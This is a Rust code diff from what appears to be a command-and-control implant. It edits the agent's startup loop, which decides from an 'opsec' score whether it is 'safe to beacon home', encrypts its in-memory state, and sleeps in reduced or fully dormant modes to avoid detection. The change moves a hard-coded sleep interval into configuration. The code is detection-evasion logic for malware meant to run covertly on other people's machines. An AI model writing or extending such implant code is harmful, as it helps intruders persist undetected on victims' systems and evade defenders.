@@ -39,8 +39,6 @@ fn dormant_startup() {
     }
 }
 
-const REDUCED_ACTIVITY_SLEEP_SECS: u64 = 120; // Sleep for 2 minutes in ReducedActivity (can make configurable later)
-
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(target_os = "windows")]
@@ -102,22 +100,22 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let current_mode = determine_agent_mode(&config);
         match current_mode {
             AgentMode::BackgroundOpsec => {
-                info!("[OPSEC] Safe to beacon home. Starting agent.");
+            info!("[OPSEC] Safe to beacon home. Starting agent.");
                 break; // Exit this loop to start agent_loop
             }
             AgentMode::ReducedActivity => {
                 info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Sleeping longer.");
                 // Ensure state is encrypted
                 { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
-                std::thread::sleep(Duration::from_secs(REDUCED_ACTIVITY_SLEEP_SECS)); 
+                std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
             }
             AgentMode::FullOpsec => {
                 info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
                 // Ensure state is encrypted (might be redundant but safe)
                 { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                 std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
-            }
         }
+    }
     }
     // --- End Initial Opsec Check Loop ---
 
@@ -146,11 +144,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 }
                 AgentMode::ReducedActivity => {
                     info!("[OPSEC] High score after agent activity. Entering ReducedActivity mode.");
-                    std::thread::sleep(Duration::from_secs(REDUCED_ACTIVITY_SLEEP_SECS)); 
+                    std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
                 }
                 AgentMode::FullOpsec => {
                      info!("[OPSEC] High score after agent activity. Entering FullOpsec mode.");
-                    std::thread::sleep(Duration::from_secs(5)); 
+                std::thread::sleep(Duration::from_secs(5));
                 }
             }
             // Note: State remains encrypted during ReducedActivity and FullOpsec sleeps here
